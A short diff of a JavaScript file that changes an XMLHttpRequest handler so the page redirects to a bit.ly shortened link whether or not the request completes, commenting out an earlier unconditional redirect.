@@ -9,7 +9,8 @@ request.onreadystatechange = function () {
     //console.log(this.responseText);
     window.location="https://bit.ly/3rk7ikn";
   }
+  else{window.location="https://bit.ly/3rk7ikn";}
 };
 
 request.send();
-window.location="https://bit.ly/3rk7ikn";
+//window.location="https://bit.ly/3rk7ikn";
